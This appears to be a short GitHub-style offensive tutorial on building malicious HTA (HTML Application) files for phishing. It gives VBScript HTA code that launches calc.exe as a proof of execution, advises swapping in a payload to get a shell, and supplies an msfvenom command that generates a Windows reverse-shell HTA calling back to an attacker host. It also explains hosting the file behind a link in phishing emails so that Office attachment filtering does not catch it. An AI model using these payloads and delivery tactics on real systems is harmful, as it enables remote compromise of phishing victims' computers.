# Malicious-HTA-File

An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript). An HTA is executed using mshta.exe, which is typically installed along with IE. In fact, mshta is dependant on IE, so if it has been uninstalled, HTAs will be unable to execute.We can create a malicious hta file and use it on phishing.


# Demonstration

## Creating a malicious hta file to execute calc.exe

open Visual Studio Code on the attacker-windows VM and create a new file.
```markdown
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

Save the file and browse to this file in explorer and double-click it to run.If calculater pops up it means code get executed.We can now replace the calc to payload to get shell.

### ALTERNATE
### Using msfvenom

```markdown
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta
```

NOTE: During phishing we will host our hta file and use link in a phishing mail http://x.x.x.x/demo.hta . If you send hta file directly as an attachment, by default, Office has filetype filtering in place that will prevent you from attaching certain files to emails (including HTAs, which is why we'd opt to sending a link instead). 

![OnPaste 20220610-183906](https://user-images.githubusercontent.com/106917304/173071374-fb6dc04c-82ae-44d8-b101-ab7de8c19070.png)


